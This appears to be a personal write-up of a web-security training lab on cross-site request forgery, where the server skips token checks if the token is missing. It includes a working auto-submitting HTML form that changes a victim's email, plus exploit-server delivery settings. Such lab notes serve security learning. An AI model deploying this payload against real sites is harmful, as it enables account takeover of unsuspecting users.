### Lab: CSRF where token validation depends on token being present

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

_____

Analysis and Exploit:

1. Logged-in as user _wiener_, captured the POST request, removed the csrf parameter in [BURP REPEATER] and sent it to the web app to set a new email: worked

2. Create an HTML form* to trick users into change the email address:
```html
<html>
    <body>
        <form action="https://0ab000a5048fb98c8049676b00d00054.web-security-academy.net/my-account/change-email" method="POST">
        <input required type="email" name="email" value="victim@yougothacked">
        <button type="submit">Update email</button>
    <script>document.forms[0].submit()</script>
    </body>
</html>
```

3. Stored and delivered the payload to the victim

_____

Script notes:

- 3 - Store and deliver payload to victim, params:
    - urlIsHttps: on
    - responseFile: /exploit
    - responseHead: HTTP/1.1 200 OK Content-Type: text/html; charset=utf-8
    - responseBody: *
    - formAction: STORE | DELIVER_TO_VICTIM
